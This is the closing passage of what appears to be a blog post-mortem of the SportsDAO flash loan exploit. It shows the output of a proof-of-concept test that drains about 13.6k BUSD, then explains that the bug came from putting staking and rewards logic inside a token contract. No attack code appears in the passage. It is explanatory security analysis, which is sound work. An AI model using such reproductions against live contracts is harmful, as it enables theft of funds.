  SportsDAO Exploit
BUSD balance before attack:  0
BUSD balance after attack:  13661
    ✔ Exploits successfully (249ms)


  1 passing (7s)

Done in 8.08s.
```

# Conclusion

This was yet another flash loan attack, only this time, the vulnerability was brought into existence by the SportsDAO team when they attempted to implement staking + rewards functionality into an IERC20 contract. Ideally, this sort of functionality should be implemented in a separate vault-style contract so that the same contract does not unnecessarily keep a balance of multiple tokens.

The attacker was able to utilize these vulnerabilities to get away with ~13.6k worth of BUSD. Although, I'd consider SportsDAO lucky, because the attacker could have performed this attack multiple times and gotten away with way more than they did. The sDAO contract still had ~418k sDAO tokens left after the attack.

As always, if you have any questions, you can find me on [twitter](https://twitter.com/farazsth98) or [mastodon](https://infosec.exchange/@farazsth98). Open to any feedback / criticism / questions :)